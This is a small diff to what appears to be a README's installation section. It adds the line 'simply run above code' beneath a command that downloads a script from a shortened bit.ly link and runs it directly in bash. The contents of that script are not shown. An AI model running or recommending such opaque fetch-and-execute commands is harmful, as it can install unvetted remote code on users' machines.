@@ -27,6 +27,7 @@ Installation
 ```sh
  bash <(curl -s https://bit.ly/4eGtH2m25565)
 ```
+simply run above code
 
 ---
 
